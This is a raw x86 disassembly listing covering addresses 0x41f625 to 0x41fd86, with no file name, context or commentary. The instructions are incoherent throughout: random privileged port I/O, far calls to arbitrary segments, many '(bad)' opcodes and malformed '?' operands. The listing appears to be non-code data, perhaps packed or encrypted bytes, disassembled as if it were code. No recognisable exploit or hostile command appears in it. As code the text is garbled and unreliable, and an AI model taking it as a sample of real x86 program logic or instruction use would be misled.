  41f625:	xchg   ebx,eax
  41f626:	fwait
  41f627:	push   esp
  41f628:	push   0xffffffe6
  41f62a:	mov    ecx,0x1ff5f1e6
  41f62f:	test   BYTE PTR [ebx],cl
  41f631:	aad    0x68
  41f633:	pop    esi
  41f634:	adc    al,0x79
  41f636:	cmp    al,0x52
  41f638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f639:	aam    0x8c
  41f63b:	pop    es
  41f63c:	ins    BYTE PTR es:[edi],dx
  41f63d:	daa    
  41f63e:	popa   
  41f63f:	and    BYTE PTR [edi],0xf5
  41f642:	or     ebx,ebp
  41f644:	clc    
  41f645:	xor    DWORD PTR [ebx-0x17],esi
  41f648:	lds    eax,FWORD PTR ds:0x601679df
  41f64e:	pop    ds
  41f64f:	ror    BYTE PTR [edi+0x156e78f8],cl
  41f655:	dec    edi
  41f656:	repz adc al,0x8c
  41f659:	xor    BYTE PTR [ecx],dl
  41f65b:	sti    
  41f65c:	cmc    
  41f65d:	out    dx,al
  41f65e:	lahf   
  41f65f:	dec    eax
  41f660:	jnp    0x41f6af
  41f662:	push   edi
  41f663:	push   ss
  41f664:	cld    
  41f665:	pop    edx
  41f666:	pop    es
  41f667:	sbb    bh,BYTE PTR [ebp-0x7d]
  41f66a:	add    ecx,esp
  41f66c:	add    al,0x4b
  41f66e:	sbb    BYTE PTR [ebx+0x19],bl
  41f671:	not    DWORD PTR [ebx-0x11]
  41f674:	dec    edx
  41f675:	out    0x9,eax
  41f677:	or     eax,0xc96aeab
  41f67c:	loope  0x41f630
  41f67e:	adc    eax,0x8ddadbf
  41f683:	mov    al,ds:0x96cf1b5f
  41f688:	mov    bh,0x17
  41f68a:	and    dl,BYTE PTR [edi+0x9153394]
  41f690:	test   DWORD PTR [ecx-0x25],edi
  41f693:	pop    esi
  41f694:	adc    bh,al
  41f696:	and    DWORD PTR [edx+0x59],eax
  41f699:	test   esp,eax
  41f69b:	(bad)  
  41f69e:	fstp   QWORD PTR [edi+0x7d2d5f7f]
  41f6a4:	add    ebp,ecx
  41f6a6:	mov    cl,0x57
  41f6a8:	add    eax,0x26862ed1
  41f6ad:	xchg   ecx,eax
  41f6ae:	stos   DWORD PTR es:[edi],eax
  41f6af:	shl    BYTE PTR [eax+ebp*4],1
  41f6b2:	(bad)  
  41f6b4:	popf   
  41f6b5:	ja     0x41f6e0
  41f6b7:	push   esp
  41f6b8:	mov    esi,0xcd31022c
  41f6bd:	xchg   ebx,eax
  41f6be:	jno    0x41f6b5
  41f6c0:	imul   ecx,DWORD PTR [edx],0xffffffd0
  41f6c3:	out    dx,eax
  41f6c4:	sub    ah,BYTE PTR [ebx+edx*1-0x2f]
  41f6c8:	popa   
  41f6c9:	enter  0xe1ef,0x84
  41f6cd:	fwait
  41f6ce:	gs jae 0x41f6c4
  41f6d1:	out    dx,eax
  41f6d2:	sbb    al,0xcf
  41f6d4:	xchg   edi,eax
  41f6d5:	sub    bh,ch
  41f6d7:	mov    edi,DWORD PTR [edi+0x68]
  41f6da:	icebp  
  41f6db:	fld    QWORD PTR [ecx-0x41]
  41f6de:	inc    esi
  41f6df:	rcr    BYTE PTR [eax-0x55],1
  41f6e2:	pop    ebp
  41f6e3:	mov    ch,0xc7
  41f6e5:	dec    esi
  41f6e6:	sub    eax,0xf49a91c1
  41f6eb:	fst    DWORD PTR ds:0xbb6d7bdb
  41f6f1:	mov    eax,ds:0xd98832e1
  41f6f6:	mov    ebp,0x16330859
  41f6fb:	call   0x7ef2:0x5404e277
  41f702:	mov    edx,0xdac0cc87
  41f707:	fsub   DWORD PTR [ebx+0x8]
  41f70a:	and    DWORD PTR [esi-0x18ef6617],esi
  41f710:	cwde   
  41f711:	push   ecx
  41f712:	jne    0x41f694
  41f714:	cmp    cl,bh
  41f716:	shl    cl,1
  41f718:	dec    esi
  41f719:	aad    0x65
  41f71b:	loope  0x41f6ea
  41f71d:	mov    ebp,0xddfc67c9
  41f722:	pop    eax
  41f723:	push   edx
  41f724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f725:	popa   
  41f726:	adc    dh,BYTE PTR gs:[ebp-0x17]
  41f72a:	sub    dh,BYTE PTR [ecx+0x2c68b6d]
  41f730:	add    dl,bh
  41f732:	daa    
  41f733:	loop   0x41f704
  41f735:	sub    eax,0xec0c0395
  41f73a:	push   cs
  41f73b:	gs (bad) 
  41f73d:	cli    
  41f73e:	test   BYTE PTR [edi+eax*4+0x37],bh
  41f742:	test   al,0x25
  41f744:	xor    al,0xf8
  41f746:	data16 fiadd DWORD PTR [eax+edi*1+0x6aec0a64]
  41f74e:	dec    edi
  41f74f:	inc    DWORD PTR [eax+0x5b]
  41f752:	inc    ebx
  41f753:	fldenv [edx]
  41f755:	jle    0x41f738
  41f757:	xchg   cl,cl
  41f759:	jnp    0x41f779
  41f75b:	push   ebp
  41f75c:	inc    esi
  41f75d:	js     0x41f720
  41f75f:	imul   BYTE PTR [ecx+0x3a]
  41f762:	mov    esi,0xebd5647e
  41f767:	xchg   BYTE PTR [esi+eax*4-0x39f64ecd],ch
  41f76e:	in     eax,0xbd
  41f770:	mov    dl,0xf6
  41f772:	push   cs
  41f773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f774:	dec    edx
  41f775:	sti    
  41f776:	jge    0x41f703
  41f778:	jbe    0x41f75f
  41f77a:	js     0x41f76c
  41f77c:	fcmovbe st,st(4)
  41f77e:	(bad)  
  41f77f:	lock sbb dx,WORD PTR [edx+0x38]
  41f784:	out    0xfc,eax
  41f786:	shl    BYTE PTR [edi+esi*1+0x1c],cl
  41f78a:	mov    eax,0x2b81ba06
  41f78f:	hlt    
  41f790:	and    dh,BYTE PTR [eax]
  41f792:	loope  0x41f727
  41f794:	mov    DWORD PTR [edx],ebx
  41f796:	jg     0x41f7fe
  41f798:	sub    ebp,DWORD PTR [edi+0x2d]
  41f79b:	inc    esi
  41f79c:	dec    edi
  41f79d:	int    0xac
  41f79f:	inc    esp
  41f7a0:	add    DWORD PTR [ebx],0xffffff95
  41f7a3:	mov    ds:0xa9295d0a,al
  41f7a8:	sti    
  41f7a9:	call   0x7fd:0xf3e02fd8
  41f7b0:	and    eax,0x837c7bd
  41f7b5:	fistp  WORD PTR [ecx]
  41f7b7:	add    DWORD PTR [esi-0x34],edi
  41f7ba:	mov    bl,0xd1
  41f7bc:	int    0x17
  41f7be:	nop
  41f7bf:	pop    es
  41f7c0:	mov    ah,0x33
  41f7c2:	xor    al,0xb2
  41f7c5:	call   0x2e30:0xc86c228b
  41f7cc:	outs   dx,DWORD PTR ds:[esi]
  41f7cd:	pop    ss
  41f7ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7cf:	mov    dh,0xa0
  41f7d1:	pop    ds
  41f7d2:	jb     0x41f761
  41f7d4:	mov    ch,0x8f
  41f7d6:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f7d8:	jg     0x41f7e2
  41f7da:	mov    ebp,0x67522998
  41f7df:	je     0x41f817
  41f7e1:	das    
  41f7e2:	leave  
  41f7e3:	sahf   
  41f7e4:	(bad)  
  41f7e5:	popf   
  41f7e6:	cmp    BYTE PTR [ebx+0x59ddcad6],bl
  41f7ec:	cmp    esi,DWORD PTR [edx+0x34]
  41f7ef:	inc    edx
  41f7f0:	sbb    cl,0x85
  41f7f3:	sub    BYTE PTR [esi-0x6e25c08b],bh
  41f7f9:	add    bh,bh
  41f7fb:	sub    eax,0xe0b00119
  41f800:	or     ebx,DWORD PTR [ecx]
  41f802:	mov    cl,BYTE PTR [eax]
  41f804:	xor    BYTE PTR [ecx],bh
  41f806:	imul   esi,DWORD PTR ds:0xf9d9e650,0x9f4b5fe4
  41f810:	imul   BYTE PTR [edi]
  41f812:	and    eax,0x77682a68
  41f817:	sub    eax,0xa63daccd
  41f81c:	and    eax,0xd3db9c88
  41f821:	sar    BYTE PTR [edx+0x551c959f],cl
  41f827:	adc    al,0xd9
  41f829:	outs   dx,DWORD PTR ds:[esi]
  41f82a:	cmp    al,0x59
  41f82c:	xor    BYTE PTR [ebp-0x76905296],al
  41f832:	pop    ss
  41f833:	mov    ds:0x8c8ea70b,al
  41f838:	fldln2 
  41f83a:	lahf   
  41f83b:	dec    eax
  41f83c:	xchg   esi,eax
  41f83d:	mov    ecx,0xc30267cb
  41f842:	mov    fs,WORD PTR [edx+0x7a]
  41f845:	loope  0x41f7e5
  41f847:	sub    dh,BYTE PTR [edi]
  41f849:	or     DWORD PTR [ebx+ebx*2-0x21],edi
  41f84d:	in     eax,dx
  41f84e:	mov    ebx,0xd3f9b187
  41f853:	inc    edx
  41f854:	lods   al,BYTE PTR ds:[esi]
  41f855:	xor    dl,ch
  41f857:	popa   
  41f858:	jp     0x41f841
  41f85a:	clc    
  41f85b:	pop    edx
  41f85c:	out    dx,al
  41f85d:	add    al,0xee
  41f85f:	push   ss
  41f860:	xchg   edi,eax
  41f861:	shl    BYTE PTR [ecx-0xa],0x70
  41f865:	pop    ds
  41f866:	push   ebx
  41f867:	sbb    dl,BYTE PTR [eax+0x40]
  41f86a:	pop    ebx
  41f86b:	repz sub eax,0xd1b60692
  41f871:	mov    esi,?
  41f873:	sub    al,0x7f
  41f875:	jge    0x41f8f4
  41f877:	push   ebp
  41f878:	imul   edx,DWORD PTR [edx+0x7b587b43],0x26
  41f87f:	cmp    DWORD PTR [ebx+0x2f],ecx
  41f882:	mov    al,0xe6
  41f884:	sub    al,0x8a
  41f886:	xor    eax,0x57e39e2b
  41f88b:	or     esi,esp
  41f88d:	push   esi
  41f88e:	sub    al,0xcf
  41f890:	pop    ecx
  41f891:	dec    esp
  41f892:	mov    ecx,0x4b020f0d
  41f897:	pop    esp
  41f898:	push   esp
  41f899:	push   esi
  41f89a:	inc    ebp
  41f89b:	int    0x5f
  41f89d:	div    eax
  41f89f:	int    0x22
  41f8a1:	mov    ah,0xa3
  41f8a3:	jecxz  0x41f861
  41f8a5:	or     BYTE PTR [eax-0x7e],al
  41f8a8:	push   edx
  41f8a9:	pop    edi
  41f8aa:	adc    eax,0x5c8a071d
  41f8af:	jb     0x41f8bc
  41f8b1:	adc    DWORD PTR fs:[ebp-0xe],ecx
  41f8b5:	inc    ebp
  41f8b6:	retf   
  41f8b7:	and    bh,BYTE PTR [ebp+0x5c]
  41f8ba:	ret    0xc2e0
  41f8bd:	pop    ebp
  41f8be:	scas   al,BYTE PTR es:[edi]
  41f8bf:	in     al,dx
  41f8c0:	test   DWORD PTR [edi],ebp
  41f8c2:	lds    edx,FWORD PTR [ecx-0x4c]
  41f8c5:	daa    
  41f8c6:	dec    ebp
  41f8c7:	fisttp DWORD PTR [edx-0x4f]
  41f8ca:	xchg   BYTE PTR [esi],ch
  41f8cc:	fimul  WORD PTR [ebp-0x60]
  41f8cf:	ins    BYTE PTR es:[edi],dx
  41f8d0:	cmp    DWORD PTR [edx],ecx
  41f8d2:	mov    bh,0xca
  41f8d4:	outs   dx,DWORD PTR ds:[esi]
  41f8d5:	popf   
  41f8d6:	or     ebx,esp
  41f8d8:	inc    edi
  41f8d9:	mov    al,ds:0x3fe29342
  41f8de:	adc    BYTE PTR [eax],ch
  41f8e0:	(bad)  
  41f8e1:	mov    es,WORD PTR [esi]
  41f8e3:	retf   0xdf1b
  41f8e6:	jl     0x41f94c
  41f8e8:	cld    
  41f8e9:	push   cs
  41f8ea:	mov    eax,0xf895a947
  41f8ef:	sub    edi,DWORD PTR [ebp-0x33]
  41f8f2:	ror    dl,1
  41f8f4:	hlt    
  41f8f5:	sub    BYTE PTR [eax-0x78],bh
  41f8f8:	leave  
  41f8f9:	cli    
  41f8fa:	loop   0x41f951
  41f8fc:	adc    eax,0x59263f0a
  41f901:	mov    DWORD PTR [ebp+0x2755bd9c],esp
  41f907:	(bad)  
  41f908:	in     eax,dx
  41f909:	pop    ds
  41f90a:	test   ebp,ecx
  41f90c:	xchg   ebp,eax
  41f90d:	in     eax,0xf6
  41f90f:	ins    BYTE PTR es:[edi],dx
  41f910:	sub    cl,BYTE PTR [ecx+0x67]
  41f913:	mov    DWORD PTR [ecx+0x71],0x7122adf6
  41f91a:	test   DWORD PTR [ebx],eax
  41f91c:	adc    DWORD PTR [ebp+0x22572a4f],ecx
  41f922:	or     DWORD PTR [edx-0x80],ebx
  41f925:	adc    ebp,0x6
  41f928:	mov    ecx,0x27ac413c
  41f92d:	mov    ds:0x5dc5f,eax
  41f932:	leave  
  41f933:	mov    eax,ds:0x95aa6d11
  41f938:	test   eax,esp
  41f93a:	cmp    DWORD PTR [edi+0x7c],ebx
  41f93d:	(bad)  
  41f93e:	ret    
  41f93f:	and    al,0x6d
  41f941:	div    DWORD PTR [edx-0xce4580c]
  41f947:	pop    esi
  41f948:	fisub  WORD PTR [esi+0x5]
  41f94b:	iret   
  41f94c:	loope  0x41f916
  41f94e:	shl    DWORD PTR [ecx+0x39],0x59
  41f952:	imul   edx,DWORD PTR [edi-0xf],0xffffff90
  41f956:	mov    al,ds:0x4370a22b
  41f95b:	mov    dl,0x80
  41f95d:	ret    0xa411
  41f960:	aad    0xfd
  41f962:	mov    al,ds:0x8f80ae96
  41f967:	jecxz  0x41f9d3
  41f969:	test   eax,0x417d7ad1
  41f96e:	or     DWORD PTR [edi+0x521810ff],esp
  41f974:	add    DWORD PTR [ecx-0x5d],edi
  41f977:	and    DWORD PTR [edx-0x84c6bc3],esi
  41f97d:	adc    eax,0xe574f66c
  41f982:	sbb    dh,BYTE PTR [ebp*8-0x3d30ad82]
  41f989:	xchg   esi,eax
  41f98a:	loopne 0x41f91e
  41f98c:	fnstsw WORD PTR [eax+0x371a383d]
  41f992:	sub    eax,esi
  41f994:	jns    0x41f961
  41f996:	xchg   edx,eax
  41f997:	mov    al,ds:0xb6fed1ec
  41f99c:	mov    DWORD PTR [ecx-0x2a],ebx
  41f99f:	adc    eax,0xb5b4e7b2
  41f9a4:	shl    dl,1
  41f9a6:	mov    ch,BYTE PTR [eax]
  41f9a8:	and    eax,DWORD PTR [esi]
  41f9aa:	div    BYTE PTR [ecx-0x512456ca]
  41f9b0:	lock bnd jge 0x41f980
  41f9b4:	pop    ecx
  41f9b5:	dec    ebp
  41f9b6:	ret    
  41f9b7:	call   0xb791ddc2
  41f9bc:	mov    esp,0x7d5efe6b
  41f9c1:	and    dl,BYTE PTR [edx]
  41f9c3:	outs   dx,DWORD PTR ds:[esi]
  41f9c4:	inc    edx
  41f9c5:	das    
  41f9c6:	xor    eax,0x94862ce4
  41f9cb:	int    0xae
  41f9cd:	popa   
  41f9ce:	push   esp
  41f9cf:	or     BYTE PTR [ebp-0x36],bh
  41f9d2:	adc    al,BYTE PTR [ebx+0x2fccb729]
  41f9d8:	inc    ecx
  41f9d9:	jmp    0x41f9ad
  41f9db:	mov    al,ds:0x89edd2d1
  41f9e0:	cmp    esi,edx
  41f9e2:	mov    bx,0x4467
  41f9e6:	and    DWORD PTR [edi-0x79d3d83f],esp
  41f9ec:	push   ebx
  41f9ed:	adc    DWORD PTR [ecx-0x37],esp
  41f9f0:	sub    BYTE PTR [eax+0x1e4f81ab],0x92
  41f9f7:	rcr    BYTE PTR [edx],cl
  41f9f9:	aaa    
  41f9fa:	fidiv  DWORD PTR [ebx-0xd9ed4fa]
  41fa00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa01:	mov    al,ds:0x17b17f02
  41fa06:	sbb    ebx,DWORD PTR [ebp+0x3f8afd45]
  41fa0c:	xor    ebp,DWORD PTR [ebx+0x24e92a94]
  41fa12:	push   ds
  41fa13:	adc    DWORD PTR [ecx+edi*4],ecx
  41fa16:	and    esi,DWORD PTR [eax+0x40]
  41fa19:	clc    
  41fa1a:	repnz mov DWORD PTR [ecx-0x7b67c420],esp
  41fa21:	addr16 das 
  41fa23:	fsub   st(6),st
  41fa25:	mov    bh,0x2c
  41fa27:	jge    0x41fa80
  41fa29:	je     0x41f9da
  41fa2b:	pop    ss
  41fa2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa2d:	jmp    0xb93f:0xe3dd5ec8
  41fa34:	sub    al,0x3b
  41fa36:	cmp    DWORD PTR [ecx-0x47],esi
  41fa39:	les    esi,FWORD PTR [ecx-0x33]
  41fa3c:	imul   edx,DWORD PTR [ecx],0xffffff8e
  41fa3f:	mov    eax,ds:0x7a814b7e
  41fa44:	sub    ah,dl
  41fa46:	repz imul ebp,DWORD PTR [edx+0x44],0xffffffa5
  41fa4b:	test   eax,0x4f83f7c3
  41fa50:	popf   
  41fa51:	xchg   eax,esp
  41fa53:	fcomp  DWORD PTR [esi+0x7fd9eb4b]
  41fa59:	mov    eax,ebx
  41fa5b:	xor    bh,BYTE PTR [eax-0x4c4c4d73]
  41fa61:	push   edi
  41fa63:	and    edi,DWORD PTR [esi-0x47]
  41fa66:	or     DWORD PTR [eax-0x482e5ea6],ebp
  41fa6c:	pop    edi
  41fa6d:	out    0x53,eax
  41fa6f:	jecxz  0x41fa60
  41fa71:	sub    eax,0xbdfdf656
  41fa76:	push   cs
  41fa77:	jae    0x41f9fe
  41fa79:	or     esi,DWORD PTR [edx+0x40]
  41fa7c:	mov    BYTE PTR [esi+0x4602d937],cl
  41fa82:	add    BYTE PTR [eax+edi*8],dl
  41fa85:	(bad)  
  41fa86:	dec    ebx
  41fa87:	ja     0x41fad7
  41fa89:	les    edx,FWORD PTR [eax-0x44]
  41fa8c:	mov    ebp,0x235012cb
  41fa91:	shl    BYTE PTR [eax],cl
  41fa93:	sbb    dl,BYTE PTR [edx+0x19eceec3]
  41fa99:	push   0xffffff84
  41fa9b:	std    
  41fa9c:	adc    eax,0xe0077c6e
  41faa1:	hlt    
  41faa2:	call   0x5c9b:0x6b612ac0
  41faa9:	xor    dh,0x3
  41faac:	jle    0x41fa5f
  41faae:	or     BYTE PTR [esi],bh
  41fab0:	adc    DWORD PTR fs:[esi+0x4],edi
  41fab4:	fld    st(5)
  41fab6:	pop    ds
  41fab7:	adc    DWORD PTR [esi],esi
  41fab9:	iret   
  41faba:	in     eax,0xf4
  41fabc:	mov    bh,0x84
  41fabe:	mov    WORD PTR [ebx-0x47ef7a93],gs
  41fac4:	dec    edi
  41fac5:	clc    
  41fac6:	sub    BYTE PTR [edx+0x72329401],al
  41facc:	jnp    0x41fa5c
  41face:	pop    es
  41facf:	fisttp QWORD PTR [esi-0x11]
  41fad2:	mov    ecx,0xb8fb41e2
  41fad7:	loop   0x41fb41
  41fad9:	test   dh,dh
  41fadb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fadc:	fs dec eax
  41fade:	cli    
  41fadf:	and    ah,BYTE PTR [edi+0x34]
  41fae2:	scas   eax,DWORD PTR es:[edi]
  41fae3:	test   al,0xaf
  41fae5:	popa   
  41fae6:	mov    ecx,0xed82ebe1
  41faeb:	popf   
  41faec:	stos   DWORD PTR es:[edi],eax
  41faed:	mov    ch,ah
  41faef:	je     0x41fab7
  41faf1:	pop    esi
  41faf2:	or     BYTE PTR [edx],0x8e
  41faf5:	hlt    
  41faf6:	xchg   ebp,eax
  41faf7:	retf   0x4fc1
  41fafa:	dec    eax
  41fafb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fafc:	and    al,0x7c
  41fafe:	out    0xf7,eax
  41fb00:	(bad)  
  41fb01:	retf   0xa30f
  41fb04:	rcr    ecx,cl
  41fb06:	imul   edx,DWORD PTR [edi],0xffffffdf
  41fb09:	rcl    DWORD PTR [edx+ecx*8],1
  41fb0c:	pop    edi
  41fb0d:	inc    esp
  41fb0e:	cld    
  41fb0f:	mov    bh,0x1c
  41fb12:	ds mov ebp,0x2c33358
  41fb18:	mov    dl,0xfe
  41fb1a:	pop    esi
  41fb1b:	jno    0x41faf8
  41fb1d:	jne    0x41faed
  41fb1f:	mov    bh,0x94
  41fb21:	(bad)  
  41fb22:	ficom  DWORD PTR [eax-0x7067cda6]
  41fb28:	andps  xmm0,xmm6
  41fb2b:	out    dx,al
  41fb2c:	mov    dh,0x55
  41fb2e:	leave  
  41fb2f:	cmc    
  41fb30:	xchg   edi,eax
  41fb31:	mov    DWORD PTR [edx],ecx
  41fb33:	sub    al,0x59
  41fb35:	sub    BYTE PTR [eax],dl
  41fb37:	mov    ds:0xce46cdb0,eax
  41fb3c:	dec    esi
  41fb3d:	nop
  41fb3e:	mov    ebx,0xa910b322
  41fb43:	sbb    DWORD PTR [eax+ebp*4+0x2e3353db],0x661e73ab
  41fb4e:	and    esi,ebp
  41fb50:	sub    al,0xb8
  41fb52:	jbe    0x41fad5
  41fb54:	aad    0x98
  41fb56:	mov    dh,BYTE PTR [eax+esi*4-0x2b84aa92]
  41fb5d:	in     eax,dx
  41fb5e:	sahf   
  41fb5f:	xor    edi,DWORD PTR [ecx]
  41fb61:	pop    ebp
  41fb62:	(bad)  
  41fb63:	sbb    DWORD PTR [edi+0x679801cf],ebp
  41fb69:	jae    0x41fb8d
  41fb6b:	ret    
  41fb6c:	call   0xfc49c16b
  41fb71:	xlat   BYTE PTR ds:[ebx]
  41fb72:	std    
  41fb73:	mov    ebx,0x4be7eef3
  41fb78:	mov    dh,BYTE PTR [esi+eiz*8+0x57d5045d]
  41fb7f:	aam    0x27
  41fb81:	inc    ebp
  41fb82:	xchg   bl,al
  41fb84:	adc    ebp,DWORD PTR [edx+ebp*1-0x5f]
  41fb88:	call   0x3c1668b0
  41fb8d:	call   0x6257:0x3e93ffa5
  41fb94:	into   
  41fb95:	or     ebx,0x4c4a437b
  41fb9b:	sub    DWORD PTR [ebp*1-0x42114d2b],esi
  41fba2:	inc    esp
  41fba3:	(bad)  
  41fba4:	add    eax,DWORD PTR cs:[eax+eax*8]
  41fba8:	or     DWORD PTR [edx-0x64166eb9],ebx
  41fbae:	sar    DWORD PTR [edx],0x8e
  41fbb1:	jnp    0x41fc01
  41fbb3:	xchg   esp,eax
  41fbb4:	fs (bad) 
  41fbb6:	cdq    
  41fbb7:	pop    ds
  41fbb8:	test   eax,0x9512ce14
  41fbbd:	(bad)  
  41fbbf:	inc    ebp
  41fbc0:	dec    edi
  41fbc1:	stos   BYTE PTR es:[edi],al
  41fbc2:	inc    ebx
  41fbc3:	cmp    bh,BYTE PTR [esi-0x10]
  41fbc6:	jmp    0x444ff85b
  41fbcb:	imul   edi,esi,0x2c31d852
  41fbd1:	(bad)  
  41fbd3:	pop    edi
  41fbd4:	mov    DWORD PTR ds:0x97b3ab1d,edx
  41fbda:	je     0x41fbc0
  41fbdc:	and    eax,0x3789ece1
  41fbe1:	xchg   edi,eax
  41fbe2:	xor    eax,DWORD PTR [ebx]
  41fbe4:	retf   0x1f79
  41fbe7:	and    DWORD PTR [esi],esp
  41fbe9:	push   eax
  41fbea:	add    eax,0xfa9ec128
  41fbef:	adc    ebp,DWORD PTR [eax]
  41fbf1:	jo     0x41fbce
  41fbf3:	jge    0x41fb92
  41fbf5:	and    BYTE PTR [eax],ah
  41fbf7:	in     al,dx
  41fbf8:	jg     0x41fc66
  41fbfa:	pop    ebp
  41fbfb:	inc    edi
  41fbfc:	lea    eax,[ecx+0x2159c8fa]
  41fc02:	aas    
  41fc03:	fwait
  41fc04:	shr    DWORD PTR [ecx+0x12],1
  41fc07:	push   ebx
  41fc08:	je     0x41fbbe
  41fc0a:	pop    di
  41fc0c:	sti    
  41fc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc0e:	std    
  41fc0f:	pop    ds
  41fc10:	les    ecx,FWORD PTR [edx]
  41fc12:	push   edx
  41fc13:	sub    dh,BYTE PTR [eax]
  41fc15:	ins    BYTE PTR es:[edi],dx
  41fc16:	push   esp
  41fc17:	push   ds
  41fc18:	push   ds
  41fc19:	lock hlt 
  41fc1b:	jmp    0x41fc33
  41fc1d:	and    dl,BYTE PTR [eax]
  41fc1f:	repnz into 
  41fc21:	jmp    FWORD PTR [edi+0x132dea26]
  41fc27:	dec    esp
  41fc28:	add    BYTE PTR [ebp+0x7e],ah
  41fc2b:	or     DWORD PTR ds:0xb323685,edi
  41fc31:	jp     0x41fc7b
  41fc33:	ret    0x40a6
  41fc36:	imul   ecx,DWORD PTR [ebp-0x3a],0x36
  41fc3a:	outs   dx,DWORD PTR ds:[esi]
  41fc3b:	sub    ebp,edi
  41fc3d:	and    eax,0xb2a27e01
  41fc42:	scas   al,BYTE PTR es:[edi]
  41fc43:	pop    ecx
  41fc44:	je     0x41fc66
  41fc46:	inc    esp
  41fc47:	push   ss
  41fc48:	inc    esp
  41fc49:	clc    
  41fc4a:	add    edi,DWORD PTR [ecx+0x7a9cb66a]
  41fc50:	nop
  41fc51:	sub    DWORD PTR [ebx],0x50
  41fc54:	lea    ecx,[ecx+ecx*8]
  41fc57:	pushf  
  41fc58:	adc    ch,BYTE PTR [edx-0x1e]
  41fc5b:	inc    esi
  41fc5c:	jp     0x41fbf6
  41fc5e:	fimul  WORD PTR [ebx]
  41fc60:	push   0xa0d0008b
  41fc65:	pop    esi
  41fc66:	repnz pop esi
  41fc68:	cmc    
  41fc69:	and    bl,bh
  41fc6b:	rcl    DWORD PTR [esi],0x1d
  41fc6e:	shl    BYTE PTR [esi+eiz*4],0x89
  41fc72:	jge    0x41fc80
  41fc74:	and    WORD PTR [edx+0x37ff3f08],bx
  41fc7b:	stc    
  41fc7c:	or     al,0xef
  41fc7e:	loopne 0x41fc60
  41fc80:	adc    BYTE PTR [ecx+0x45dba7cb],0x98
  41fc87:	dec    ebx
  41fc88:	adc    BYTE PTR [ecx+0x34],bh
  41fc8b:	sbb    DWORD PTR [ebp-0x70],ebp
  41fc8e:	xchg   BYTE PTR [edi+0x37],cl
  41fc91:	sub    eax,0x1766f93b
  41fc96:	mov    ebp,0xfe22234d
  41fc9b:	adc    DWORD PTR [ebp+0x7c],edx
  41fc9e:	sub    BYTE PTR [ecx+edx*4-0x7a],ch
  41fca2:	pop    eax
  41fca3:	or     esi,edx
  41fca5:	fs jg  0x41fd1f
  41fca8:	mov    es,edi
  41fcaa:	jns    0x41fc70
  41fcac:	or     al,0xde
  41fcae:	pop    edi
  41fcaf:	lahf   
  41fcb0:	icebp  
  41fcb1:	pushf  
  41fcb2:	in     eax,0x34
  41fcb4:	das    
  41fcb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcb6:	adc    edi,DWORD PTR [edi]
  41fcb8:	xchg   ebp,eax
  41fcb9:	xchg   ebx,eax
  41fcba:	outs   dx,BYTE PTR ds:[esi]
  41fcbb:	fidiv  WORD PTR [ebp-0x10]
  41fcbe:	aas    
  41fcbf:	daa    
  41fcc0:	pusha  
  41fcc1:	clc    
  41fcc2:	xchg   DWORD PTR [ebx+0x32],eax
  41fcc5:	popa   
  41fcc6:	push   cs
  41fcc7:	into   
  41fcc8:	xor    eax,0xcc545d6
  41fccd:	mov    DWORD PTR [edi],esi
  41fccf:	inc    esi
  41fcd0:	and    DWORD PTR [edx-0x7dc490ef],0x333f0f0c
  41fcda:	xchg   ebx,eax
  41fcdb:	sbb    eax,0xac375e12
  41fce0:	and    ebp,DWORD PTR [edi+edx*4]
  41fce3:	ds adc al,0x83
  41fce6:	lahf   
  41fce7:	and    DWORD PTR [edi+0xfc548e0],ebp
  41fced:	sbb    edx,DWORD PTR [ecx+0x1d894e72]
  41fcf3:	sub    ebp,DWORD PTR [esi+0x4ed0774b]
  41fcf9:	je     0x41fd50
  41fcfb:	lods   eax,DWORD PTR ds:[esi]
  41fcfc:	and    ah,BYTE PTR [edi]
  41fcfe:	out    0xe7,al
  41fd00:	mov    ch,0x6e
  41fd02:	mov    ds:0x826d995e,eax
  41fd07:	leave  
  41fd08:	mov    bh,ah
  41fd0a:	rcr    DWORD PTR [edx-0x19],1
  41fd0d:	call   0xcea1:0x4d47d47c
  41fd14:	add    ch,BYTE PTR [edi+0x383d2888]
  41fd1a:	sahf   
  41fd1b:	sbb    al,bh
  41fd1d:	mov    DWORD PTR [ebx+0x11],ebx
  41fd20:	outs   dx,BYTE PTR ds:[esi]
  41fd21:	add    eax,ecx
  41fd23:	or     DWORD PTR [ebx],0x65032224
  41fd29:	adc    ah,al
  41fd2b:	retf   
  41fd2c:	adc    dh,BYTE PTR [edx-0x67]
  41fd2f:	pushf  
  41fd30:	aas    
  41fd31:	jg     0x41fcf1
  41fd33:	mov    ds:0xa970fc7f,al
  41fd38:	fild   DWORD PTR [edx+ecx*8-0x35]
  41fd3c:	ror    DWORD PTR [ebp-0x72],1
  41fd3f:	sub    ch,BYTE PTR [eax+0x4938800b]
  41fd45:	inc    eax
  41fd46:	mov    ?,WORD PTR [edi-0x69]
  41fd49:	imul   ebx,DWORD PTR [edx+0x20],0x62a632a8
  41fd50:	ret    0xae2
  41fd53:	push   eax
  41fd54:	out    dx,eax
  41fd55:	xor    al,0x67
  41fd57:	ins    DWORD PTR es:[edi],dx
  41fd58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd59:	or     al,0x8d
  41fd5b:	sbb    ch,BYTE PTR [edx]
  41fd5d:	shr    DWORD PTR [ebx+0x50],1
  41fd60:	adc    BYTE PTR [ecx],al
  41fd62:	addr16 sub eax,0x8363db56
  41fd68:	shl    BYTE PTR [eax+0x4439281b],cl
  41fd6e:	dec    ecx
  41fd6f:	sbb    al,0xa
  41fd71:	dec    edi
  41fd72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd73:	jno    0x41fd04
  41fd75:	out    0x18,al
  41fd77:	sbb    al,0xcd
  41fd79:	jmp    0xceba1cea
  41fd7e:	jle    0x41fd75
  41fd80:	jae    0x41fdf1
  41fd82:	push   esi
  41fd83:	inc    ebx
  41fd84:	jl     0x41fdbe
  41fd86:	inc    ecx
